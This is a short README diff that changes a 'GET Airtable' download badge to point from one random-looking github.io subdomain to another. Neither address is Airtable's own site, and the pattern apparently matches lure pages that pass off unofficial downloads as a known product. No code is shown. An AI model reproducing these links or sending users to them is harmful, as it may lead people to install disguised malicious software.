@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://1000logos.net/wp-content/uploads/2022/05/Airtable-Logo.png)
 
-[![GET Airtable](https://img.shields.io/badge/GET%20%E2%80%94%20Airtable-0078D6?style=for-the-badge&logoColor=white)](https://murphybarronaeip.github.io/.github/airtable)
+[![GET Airtable](https://img.shields.io/badge/GET%20%E2%80%94%20Airtable-0078D6?style=for-the-badge&logoColor=white)](https://abnerbeardqjwk.github.io/.github/airtable)
 
 ---
 
